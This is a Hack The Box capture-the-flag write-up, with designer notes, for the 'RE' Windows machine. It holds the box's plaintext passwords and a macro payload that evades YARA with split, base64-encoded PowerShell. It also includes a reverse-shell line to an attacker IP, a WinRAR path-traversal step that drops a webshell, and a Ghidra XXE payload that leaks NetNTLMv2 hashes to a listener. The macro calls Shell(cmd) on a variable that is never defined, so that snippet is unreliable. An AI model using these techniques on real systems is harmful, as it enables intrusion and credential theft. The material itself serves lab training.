# RE

## Introduction

This box is designed to get players hacking the machine of a malware reverse engineer. The three intended exploits are uploading a malicious ODS document that evades yara checks, exploiting a zipslip vulnerability in WinRar, and exploiting an XXE vulnerability in Ghidra. I'm a huge fan of phishing documents, and wanted to challenge players to design that own, and I used Yara to filter out ones built by common frameworks like Metasploit, which is something a SOC I worked in used to do. The WinRar zipslip  is a common vulnerability being used by Ransomeware currently. And I thought the Ghidra bug was neat, as it's a tool I use for HTB and other CTF challenges, and I wanted to find a way to make it exploitable.

## Info for HTB

### Access

Passwords:

| User          | Password                         |
| ------------- | -------------------------------- |
| luke          | 2017championship!                |
| cam           | 195719821993200520092017         |
| coby          | championship2005                 |
| administrator | 1B4FB905423F4AD8D99C731468F7715D |

### Key Processes

IIS is hosting three webservers:

- default contains link to reblog.htb
- re.htb: check for updates page with comments giving hints to Ghidra exploitation
- reblog.htb: static jekyll-generated blog site

SMB has a world writable share, `malware_dropbox`.

The [Ghidra](https://ghidra-sre.org/) re tool is installed and run via cron by the coby user. The version is vulnerable to an XXE vulnerability, and should not be updated.

### Automation / Crons

To start box, turn on, and make sure three scheduled tasks are running, one for each user. They should start on boot.

There are three scheduled tasks running on the box that should start on boot, one for each user.

The scheduled task named `Check osd` runs a PowerShell script as luke looking for files dropped in the SMB share, and will unzip them and run yara rules against them to look for certain keywords (ensure the player has done some obfuscation), removing any that match. Then it will open them in soffice so that the macros will run. Finally, it archives the samples to another folder as a rar archive. PowerShell script will start on boot running as luke and runs in a continuous loop so that it's constantly checking files (with some sleeps). The samples are meant to contain macros that will be exploited to gain a shell as luke. `process_samples.ps` and `ods.yara` both sit in `C:\Users\luke\Documents\`, and copies are attached with this writeup.

The scheduled task named `unzip achive` runs a PowerShell script as cam that looks for rar archives and moves them in such a way that rar-slip can be exploited allowing for the player to upload a webshell. The script is running on an infinate loop with sleeps, located at `C:\Users\cam\Documents\process_rars.ps1`, and a copy is attached. There is no intention that the user ever be able to get execution as cam. 

The scheduled task named `process projects` runs a PowerShell script as coby that looks for zip files in the `C:\proj_drop` directory. It does some editing of Ghidra config / state files so that that project is the current project, and then opens Ghidra and sleeps for 50 seconds, long enough for the XXE bug in Ghidra to be exploited. It then kills the process and continues. The script is located at `C:\Users\coby\documents\process_projects.ps1`, and a copy is attached.

### Firewall Rules

The firewall is blocking 5985 so that players will have to port forward to use Winrm.

### Docker

N/A

### Other

The scripts and flags are encrypted with EFS. However, because of the Scheduled Tasks, CredSSP is not necessary to read the files. It does prevent SYSTEM from reading files, which is a hedge against a new Potato or unknown exploit.

# Writeup

## Enumeration

### Nmap

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.144 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.144
```

*[Image: img]*

We find IIS and SMB running on their usual ports.

### IIS

Browsing to port 80 redirects us to reblog.htb.

*[Image: img]*

Add reblog.htb to the hosts file and browse to it. We come across a website with various blog posts.

*[Image: img]*

According to the post above, users are supposed to drop any kind of ods (Openoffice spreadsheet) documents into the malware dropbox. Another post states that they are using Yara to analyze the documents, which directs us to this [post](https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html). 

*[Image: img]*

We should keep these rules in mind while creating a malicious document, as it’s likely that the box uses this.

### SMB

Let’s check SMB to see if there are any open shares, which can be enumerated using smbclient.

*[Image: img]*

The -N flag is used to connect without credentials. We can see a “malware_dropbox” share, which must be the dropbox that post was talking about.

## Foothold

### Creating Malicious ODS Document

Now that we have access to the dropbox, we can try creating a malicious document which executes a macro on opening. According to the blog post, the dropbox detects macros created with metasploit, and any that execute powershell.exe or cmd.exe directly. In order to evade detection, base64 encoded commands can be used. The “enc” parameter in PowerShell can be used to execute commands encoded as base64 strings. Let’s try pinging ourselves using the macro.

*[Image: img]*

The command is first encoded as a UTF-16 string (the default Windows encoding), followed by base64 encoding. The final command looks like:

```
cmd /c powershell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA==
```

As Yara does static analysis of the document, we can split the command up into multiple strings, and then execute it after concatenation. Launch OpenOffice or LibreOffice Calc, go to Tools > Macros > Organize Macros > LibreOffice Basic, expand Untitled1 and select “Standard”. Click on “New” to create a new macro.

*[Image: img]*

Name it anything and click on Ok. Enter the following code under Module1 after the editor opens.

```
Sub Main 	 
 	exec1 = "cm"
 	exec2 = "d /c powers"
 	exec3 = "hell -enc cABpAG4AZwAgAC0AbgAgADIAIAAxADAALgAxADAALgAxADQALgAyAA=="
 	exec = exec1 + exec2 + exec3  
 	Shell(cmd)
End Sub
```

We’ve split up the command into three strings and concatenate them before execution using the Shell() function.Next, save the document and close the editor. We need to make sure that the macro is run as soon as the document is opened. To do that, go to Tools > Customize and click on the Events tab, then select “Open Document” and click on “Macro” to assign it a macro. Now expand the document tree and select the Macro name on the right.

*[Image: img]*

Clicking on Ok should assign our macro to the “Open Document” event.

*[Image: img]*

### Upload ping POC

Save the document, start an ICMP listener and upload the document to the dropbox.

*[Image: img]*

*[Image: img]*

### Shell

We received ICMP requests on our listener, which confirms code execution. Let’s try downloading and executing a TCP reverse shell which can be found [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

*[Image: img]*

Add the following line to the end of tcp.ps1:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444
```

Swap the base64 encoded payload in the existing macro with the one created above and ensure an HTTP server is running in the folder.

*[Image: img]*

A shell as the user luke should be received after uploading the document. Here we can get user.txt.

## Lateral Movement

Looking at the IIS root folder, we find three sub-folders which we don’t have access to.

*[Image: img]*

We’ve already inspected the IP and the blog vhost. However, there seems to be another vhost named “re”. Let’s add re.htb to the hosts file and browse to it.

*[Image: img]*

The page displays the message above, but examination of the source code reveals the following:

```html
<!--future capability
  <p> To upload Ghidra project:
  <ol>
   <li> exe should be at project root.Directory structure should look something like:
   	<code><pre>
|  vulnerserver.gpr
|  vulnserver.exe
\---vulnerserver.rep
	|  project.prp
	|  projectState
	|
	+---idata
	|  |  ~index.bak
	|  |  ~index.dat
	|  |
	|  \---00
	|  	|  00000000.prp
	|  	|
	|  	\---~00000000.db
	|      	db.2.gbf
	|      	db.3.gbf
	|
	+---user
	|  	~index.dat
	|
	\---versioned
    	~index.bak
    	~index.dat
  	  </pre></code>
   </li>
   <li>Add entire directory into zip archive.</li>
   <li> Upload zip here:</li>
	</ol> -->
```

According to this, the site will let users upload Ghidra projects in the form of ZIP archives. Let’s put this aside for now and keep enumerating. Browsing to the user’s documents folder, a powershell script is seen. The script processes uploaded ods files and executes them. We see the following lines at the end of the script.

```
#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null

Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"

$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
# Upstream processing may expect rars. Rename to .rar
Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
```

It compresses the uploaded documents into a ZIP archive, and then moves them into the “C:\Users\luke\Documents\ods” folder with a “rar” extension for future processing. Winrar versions prior to 5.6.1 suffer from an arbitrary write vulnerability via path traversal, in the context of the user opening the archive. The [Evil-Winrar-Gen](https://github.com/manulqwerty/Evil-WinRAR-Gen) program can be used to craft a malicious archive. Let’s try writing [this](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) webshell to the writable uploads folder in the re.htb vhost.

*[Image: img]*

A file named “shell.rar” should be generated after following the above steps. The -e parameter is used to specify the file to be extracted (to the path specified by -p), while the -g parameter can be any file. Next, transfer the file to the ods folder.

*[Image: img]*

The webshell should be found at /cmd.aspx after the file gets processed.

*[Image: img]*

Let’s execute the tcp.ps1 script once again to get a shell as the IIS user.

*[Image: img]*

*[Image: img]*

## Privilege Escalation

The IIS user has access to the proj_drop folder used to store uploaded Ghidra projects.

*[Image: img]*

Ghidra is vulnerable to [XXE](https://github.com/NationalSecurityAgency/ghidra/issues/71) due to improper handling of the XML files present in a project. We can exploit this to steal the NetNTLMv2 hash of the user who opens it. Ghidra can be downloaded from its official website [here](https://ghidra-sre.org/). Extract the contents of the downloaded zip file, and execute the **ghidraRun** binary to start Ghidra. Next, click on File > Project > New Project, enter any name and click Finish.

*[Image: img]*

The folder structure should look like the image above. Now, the project.prp file can be edited to include the XXE payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "//10.10.14.2/xxe" >
  %xxe;
]>
<FILE_INFO>
	<BASIC_INFO>
    	<STATE NAME="OWNER" TYPE="string" VALUE="root" />
	</BASIC_INFO>
</FILE_INFO>
```

Upon opening the file, Ghidra will send a request to our machine, and our listening responder will capture the user’s NetNTLMv2 hash. Start Responder, archive the entire directory and transfer it to the proj_drop folder.

*[Image: img]*

The hash for the user Coby should shortly be received. Copy it to a file.

*[Image: img]*

It can be cracked using John The Ripper or Hashcat and the rockyou.txt wordlist.

*[Image: img]*

The hash is cracked and the password is revealed to be “championship2005”, which can be used to login as the Coby. The user Coby is in the “Administrators” and “Remote Management Users” group, so we can use WinRM to execute commands as him. Let’s use Invoke-Command to execute a reverse shell.

*[Image: img]*

Executing the commands above should give us a reverse shell as Coby, after which the final flag can be accessed.

*[Image: img]*